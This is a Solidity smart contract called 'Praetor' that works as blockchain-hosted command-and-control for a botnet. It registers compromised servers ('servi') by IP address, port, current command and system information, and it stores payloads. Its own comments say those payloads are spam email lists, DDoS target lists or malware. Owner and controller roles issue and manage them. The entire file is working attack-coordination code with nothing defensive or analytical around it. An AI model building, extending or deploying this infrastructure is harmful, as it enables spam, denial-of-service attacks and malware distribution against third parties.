// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma abicoder v2;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

/**
 * @dev This contract is intended to be used on a private blockchain
 * and as such there have been very little considerations for gas costs
 */

contract Praetor is AccessControl {
    using SafeMath for uint256;

    bytes32 public constant OWNER_ROLE = keccak256("OWNER_ROLE");
    bytes32 public constant CONTROLLER_ROLE = keccak256("CONTROLLER_ROLE");

    /**
     * @dev Struct to hold details of a servus
     * @param servusId The id of the servus, probably a hash of the server details
     * @param ip The ip address of the servus
     * @param port The port the servus is listening on
     * @param currentCommand The current command the servus is executing
     * @param systemInfo The system info of the servus
     */
    struct Servus {
        bytes32 servusId;
        string ip;
        uint256 port;
        bytes32 currentCommand;
        bytes32 systemInfo;
    }

    /**
     * @dev Array of servus structs
     */
    Servus[] internal servi;

    /**
     * @dev A mapping of payloads to be executed by the servus
     * these could be email list for spamming, or a list of
     * ip addresses to be ddosed.
     * I think you could even store malware in here?
     */
    mapping(bytes32 => bytes[]) internal payloads;

    modifier onlyOwner() {
        require(hasRole(OWNER_ROLE, msg.sender), "Address does not have owner permission");
        _;
    }

    modifier onlyController() {
        require(
            hasRole(CONTROLLER_ROLE, msg.sender) || hasRole(OWNER_ROLE, msg.sender),
            "Address does not have controller permission"
        );
        _;
    }

    /**
     * @dev Event for the addition of a new servus
     */
    event ServiAdded(bytes32[] indexed servusId);

    /**
     * @dev Event for the removal of a servus
     */
    event ServiRemoved(bytes32[] indexed servusId);

    constructor() {
        _setupRole(OWNER_ROLE, msg.sender);
        _setRoleAdmin(OWNER_ROLE, OWNER_ROLE);
        _setRoleAdmin(CONTROLLER_ROLE, OWNER_ROLE);
    }

    /**
     * @dev Returns all current servi
     */
    function getServi() external view onlyController returns (Servus[] memory) {
        return servi;
    }

    /**
     * @dev Allows owner to add an array of servi written over the top of the existing array
     * @param _servi An array of servus structs
     */
    function addServi(Servus[] memory _servi) external onlyOwner {
        bytes32[] memory servusId = new bytes32[](_servi.length);
        for (uint256 i = 0; i < _servi.length; i++) {
            servi.push(_servi[i]);
            servusId[i] = _servi[i].servusId;
        }
        emit ServiAdded(servusId);
    }

    /**
     * @dev Allows owner to remove an array of servi by id
     * @param _servusId An array of servus ids
     */
    function removeServi(bytes32[] memory _servusId) external onlyOwner {
        for (uint256 i = 0; i < _servusId.length; i++) {
            for (uint256 j = 0; j < servi.length; j++) {
                if (servi[j].servusId == _servusId[i]) {
                    delete servi[j];
                }
            }
        }
        emit ServiRemoved(_servusId);
    }

    /**
     * @dev Returns payload
     * @param _payloadId The id of the payload
     */
    function getPayload(bytes32 _payloadId) external view returns (bytes[] memory) {
        return payloads[_payloadId];
    }

    /**
     * @dev Allows controllers to add a payload as long as it doesn't write
     * over an existing payload
     */
    function addPayload(bytes32 _payloadId, bytes[] memory _payload) external onlyController {
        require(payloads[_payloadId].length == 0, "Payload already exists");
        payloads[_payloadId] = _payload;
    }

    /**
     * @dev Allows owner to remove a payload
     */
    function removePayload(bytes32 _payloadId) external onlyOwner {
        delete payloads[_payloadId];
    }

    /**
     * @dev Allows owner to transfer ownership of the contract
     * @param newOwner The address of the new owner
     */
    function transferOwnership(address newOwner) external onlyOwner {
        grantRole(OWNER_ROLE, newOwner);
        revokeRole(OWNER_ROLE, msg.sender);
    }
}
